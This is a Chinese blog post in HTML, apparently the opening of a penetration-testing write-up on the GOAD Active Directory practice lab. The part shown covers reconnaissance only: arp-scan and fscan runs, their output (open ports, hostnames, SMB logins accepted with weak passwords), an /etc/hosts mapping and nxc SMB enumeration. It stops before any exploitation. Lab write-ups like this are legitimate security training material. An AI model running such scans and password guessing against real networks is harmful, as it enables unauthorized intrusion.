

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
  <link rel="icon" href="/img/icon.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Skyarrow">
  <meta name="keywords" content="">
  
    <meta name="description" content="配置使用windows原生环境配vmware，整体大小大概90多个G 配置教程网上有很多，这里不再赘述。 先添加映射表，IPrange为192.168.10.0&#x2F;24 本地攻击机ip为192.168.10.150，网卡为eth2 1234567891011┌──(root㉿kaada)-[&#x2F;home&#x2F;kali&#x2F;Desktop]└─# arp-scan -I eth2 -lInterfac">
<meta property="og:type" content="article">
<meta property="og:title" content="从零开始的GOAD生活(上)">
<meta property="og:url" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/index.html">
<meta property="og:site_name" content="Skyarrow&#39;s blog">
<meta property="og:description" content="配置使用windows原生环境配vmware，整体大小大概90多个G 配置教程网上有很多，这里不再赘述。 先添加映射表，IPrange为192.168.10.0&#x2F;24 本地攻击机ip为192.168.10.150，网卡为eth2 1234567891011┌──(root㉿kaada)-[&#x2F;home&#x2F;kali&#x2F;Desktop]└─# arp-scan -I eth2 -lInterfac">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/vmware_uAVri521nE.png">
<meta property="og:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/remove_mic.png">
<meta property="og:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/rbcd_after_remove_mic.png">
<meta property="article:published_time" content="2026-02-01T06:23:40.000Z">
<meta property="article:modified_time" content="2026-02-01T12:56:14.758Z">
<meta property="article:author" content="Skyarrow">
<meta property="article:tag" content="GOAD">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/2026/02/01/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84GOAD%E7%94%9F%E6%B4%BB-%E4%B8%8A/vmware_uAVri521nE.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>从零开始的GOAD生活(上) - Skyarrow&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"busuanzi":{"enable":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Skyarrow&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>Links</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="从零开始的GOAD生活(上)"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2026-02-01 14:23" pubdate>
          February 1, 2026 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          6.5k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          54 mins
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> views
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">从零开始的GOAD生活(上)</h1>
            
            
              <div class="markdown-body">
                
                <p>配置使用windows原生环境配vmware，整体大小大概90多个G</p>
<p>配置教程网上有很多，这里不再赘述。</p>
<p>先添加映射表，IPrange为192.168.10.0&#x2F;24</p>
<p>本地攻击机ip为192.168.10.150，网卡为eth2</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(root㉿kaada)-<span class="hljs-string">[/home/kali/Desktop]</span><br>└─# arp-scan -I eth2 -l<br>Interface: eth2, type: EN10MB, MAC: <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:3a:9f:c8, IPv4: <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">150</span><br>Starting arp-scan <span class="hljs-number">1</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span> with <span class="hljs-number">256</span> hosts (https://github.com/royhills/arp-scan)<br><span class="hljs-number">192.168.10.1</span>    <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:c0:<span class="hljs-number">00</span>:<span class="hljs-number">01</span>       VMware, Inc.<br><span class="hljs-number">192.168.10.12</span>   <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:f4:ee:<span class="hljs-number">61</span>       VMware, Inc.<br><span class="hljs-number">192.168.10.22</span>   <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:ed:<span class="hljs-number">25</span>:ab       VMware, Inc.<br><span class="hljs-number">192.168.10.10</span>   <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:7f:<span class="hljs-number">44</span>:<span class="hljs-number">75</span>       VMware, Inc.<br><span class="hljs-number">192.168.10.11</span>   <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:<span class="hljs-number">07</span>:a9:9b       VMware, Inc.<br><span class="hljs-number">192.168.10.23</span>   <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:ed:2a:<span class="hljs-number">93</span>       VMware, Inc.<br><br></code></pre></td></tr></table></figure>

<p>使用fscan对该网段进行扫描</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./FScan_2.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>_linux_x32 -h <span class="hljs-number">192.168.10.1</span>-<span class="hljs-number">192.168.10.149</span>,<span class="hljs-number">192.168.10.151</span>-<span class="hljs-number">192.168.10.254</span><br></code></pre></td></tr></table></figure>

<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs inform7">──(root㉿kaada)-<span class="hljs-comment">[/home/kali/Desktop]</span><br>└─# ./FScan_2.0.1_linux_x32 -h 192.168.10.1-192.168.10.149,192.168.10.151-192.168.10.254<br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.1<br>                                                                                                                                                           <br><span class="hljs-comment">[1.2s]</span>     已选择服务扫描模式                                                                                                                              <br><span class="hljs-comment">[1.2s]</span>     开始信息扫描<br><span class="hljs-comment">[1.2s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.2s]</span>     generate_ip_range_full<br><span class="hljs-comment">[1.2s]</span>     最终有效主机数量: 253<br><span class="hljs-comment">[1.2s]</span>     开始主机扫描<br><span class="hljs-comment">[1.2s]</span>     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                             <br><span class="hljs-comment">[1.2s]</span> <span class="hljs-comment">[*]</span> 目标 192.168.10.12   存活 (ICMP)<br><span class="hljs-comment">[1.2s]</span> <span class="hljs-comment">[*]</span> 目标 192.168.10.11   存活 (ICMP)<br><span class="hljs-comment">[1.2s]</span> <span class="hljs-comment">[*]</span> 目标 192.168.10.10   存活 (ICMP)<br><span class="hljs-comment">[1.2s]</span> <span class="hljs-comment">[*]</span> 目标 192.168.10.22   存活 (ICMP)<br><span class="hljs-comment">[1.2s]</span> <span class="hljs-comment">[*]</span> 目标 192.168.10.23   存活 (ICMP)<br><span class="hljs-comment">[4.2s]</span>     存活主机数量: 5<br><span class="hljs-comment">[4.2s]</span>     有效端口数量: 233<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.12:135<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.12:445<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.12:389<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.12:139<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.12:88<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:139<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:135<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:88<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.11:445<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:80<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.11:389<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.11:139<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:445<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.10:389<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.11:135<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.22:80<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.23:80<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.23:139<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.22:445<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.22:139<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.23:1433<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.11:88<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.22:135<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.23:445<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.22:1433<br><span class="hljs-comment">[4.3s]</span> <span class="hljs-comment">[*]</span> 端口开放 192.168.10.23:135<br><span class="hljs-comment">[7.3s]</span>     扫描完成, 发现 26 个开放端口<br><span class="hljs-comment">[7.3s]</span>     存活端口数量: 26<br><span class="hljs-comment">[7.3s]</span>     开始漏洞扫描<br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 192.168.10.23                                                                                                                                    <br>主机名: braavos                                                                                                                                            <br>发现的网络接口:                                                                                                                                            <br>   IPv4地址:                                                                                                                                               <br>      └─ 192.168.10.23                                                                                                                                     <br>      └─ 192.168.21.153                                                                                                                                    <br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 192.168.10.11                                                                                                                                    <br>主机名: winterfell                                                                                                                                         <br>发现的网络接口:                                                                                                                                            <br>   IPv4地址:                                                                                                                                               <br>      └─ 192.168.10.11                                                                                                                                     <br>      └─ 192.168.21.150                                                                                                                                    <br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[+]</span> NetBios 192.168.10.22   NORTH\CASTELBLACK             <br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[+]</span> NetBios 192.168.10.11   DC:NORTH\WINTERFELL        <br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[+]</span> NetBios 192.168.10.12   DC:meereen.essos.local           Windows Server 2016 Standard Evaluation 14393<br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[+]</span> NetBios 192.168.10.23   braavos.essos.local                 Windows Server 2016 Standard Evaluation 14393<br><span class="hljs-comment">[7.3s]</span>     系统信息 192.168.10.12 <span class="hljs-comment">[Windows Server 2016 Standard Evaluation 14393]</span><br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 192.168.10.22                                                                                                                                    <br>主机名: castelblack                                                                                                                                        <br>发现的网络接口:                                                                                                                                            <br>   IPv4地址:                                                                                                                                               <br>      └─ 192.168.10.22                                                                                                                                     <br>      └─ 192.168.21.152                                                                                                                                    <br><span class="hljs-comment">[7.3s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 192.168.10.10                                                                                                                                    <br>主机名: kingslanding                                                                                                                                       <br>发现的网络接口:                                                                                                                                            <br>   IPv4地址:                                                                                                                                               <br>      └─ 192.168.10.10                                                                                                                                     <br><span class="hljs-comment">[7.4s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://192.168.10.23      状态码:200 长度:703    标题:IIS Windows Server<br><span class="hljs-comment">[7.4s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 192.168.10.12                                                                                                                                    <br>主机名: meereen                                                                                                                                            <br>发现的网络接口:                                                                                                                                            <br>   IPv4地址:                                                                                                                                               <br>      └─ 192.168.10.12                                                                                                                                     <br>      └─ 192.168.21.151                                                                                                                                    <br><span class="hljs-comment">[7.4s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://192.168.10.22      状态码:200 长度:149    标题:无标题<br><span class="hljs-comment">[7.4s]</span>     POC加载完成: 总共387个，成功387个，失败0个<br><span class="hljs-comment">[7.4s]</span> <span class="hljs-comment">[+]</span> NetBios 192.168.10.10   DC:SEVENKINGDOMS\KINGSLANDING<br><span class="hljs-comment">[7.4s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://192.168.10.10      状态码:200 长度:703    标题:IIS Windows Server<br><span class="hljs-comment">[7.7s]</span> <span class="hljs-comment">[+]</span> SMB认证成功 192.168.10.23:445 admin:123456<br><span class="hljs-comment">[7.7s]</span> <span class="hljs-comment">[+]</span> SMB认证成功 192.168.10.22:445 admin:root<br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:admin 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:root 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:123456 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:admin123 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:pass123 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass: 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[7.9s]</span>     SMB2共享信息 192.168.10.23:445 admin Pass:pass@123 共享:<span class="hljs-comment">[ADMIN$ all C$ CertEnroll IPC$ public]</span><br><span class="hljs-comment">[8.1s]</span>     SMB2共享信息 192.168.10.22:445 admin Pass:root 共享:<span class="hljs-comment">[ADMIN$ all C$ IPC$ public]</span><br><span class="hljs-comment">[8.1s]</span>     SMB2共享信息 192.168.10.22:445 admin Pass:admin 共享:<span class="hljs-comment">[ADMIN$ all C$ IPC$ public]</span><br><span class="hljs-comment">[8.1s]</span>     SMB2共享信息 192.168.10.22:445 admin Pass:pass@123 共享:<span class="hljs-comment">[ADMIN$ all C$ IPC$ public]</span><br><span class="hljs-comment">[8.1s]</span>     SMB2共享信息 192.168.10.22:445 admin Pass:password 共享:<span class="hljs-comment">[ADMIN$ all C$ IPC$ public]</span><br><span class="hljs-comment">[8.1s]</span>     SMB2共享信息 192.168.10.22:445 admin Pass:111111 共享:<span class="hljs-comment">[ADMIN$ all C$ IPC$ public]</span><br><span class="hljs-comment">[51.7s]</span>     扫描已完成: 47/47<br></code></pre></td></tr></table></figure>

<p>将其ip和对应域名填入&#x2F;etc&#x2F;hosts</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.10.10</span> north.sevenkingdoms.local sevenkingdoms.local goad.test dc01.sevenkingdoms.local<br><span class="hljs-number">192.168.10.11</span> north.sevenkingdoms.local dc02.sevenkingdoms.local<br><span class="hljs-number">192.168.10.12</span> essos.local dc03.essos.local<br><span class="hljs-number">192.168.10.22</span> castelblack.north.sevenkingdoms.local srv02.north.sevenkingdoms.local<br><span class="hljs-number">192.168.10.23</span> meereen.essos.local srv03.essos.local<br><span class="hljs-number">10.129.229.88</span> cozyhosting.htb<br></code></pre></td></tr></table></figure>

<p>可以发现共有三个域（签名为True）</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.23</span>   <span class="hljs-number">445</span>    BRAAVOS          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:BRAAVOS) (<span class="hljs-keyword">domain</span>:essos.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">True</span>)                                                                                                                                            <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.12</span>   <span class="hljs-number">445</span>    MEEREEN          [*] Windows <span class="hljs-keyword">Server</span> <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> x64 (<span class="hljs-type">name</span>:MEEREEN) (<span class="hljs-keyword">domain</span>:essos.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">True</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)<br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span>   <span class="hljs-number">445</span>    KINGSLANDING     [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:KINGSLANDING) (<span class="hljs-keyword">domain</span>:sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                        <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.22</span>   <span class="hljs-number">445</span>    CASTELBLACK      [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:CASTELBLACK) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">False</span>) (SMBv1:<span class="hljs-keyword">None</span>)                                                                                                                                   <br>SMB         <span class="hljs-number">192.168</span><span class="hljs-number">.10</span><span class="hljs-number">.11</span>   <span class="hljs-number">445</span>    WINTERFELL       [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:WINTERFELL) (<span class="hljs-keyword">domain</span>:north.sevenkingdoms.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">None</span>) (<span class="hljs-keyword">Null</span> Auth:<span class="hljs-keyword">True</span>)                                                                                                                    <br>Running nxc against <span class="hljs-number">256</span> targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ <span class="hljs-number">100</span>% <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>

<p>决定先打临冬城。</p>
<p>Winterfell 域控制器允许匿名连接</p>
<p>用空用户&#x2F;空密码进行用户枚举。</p>
<blockquote>
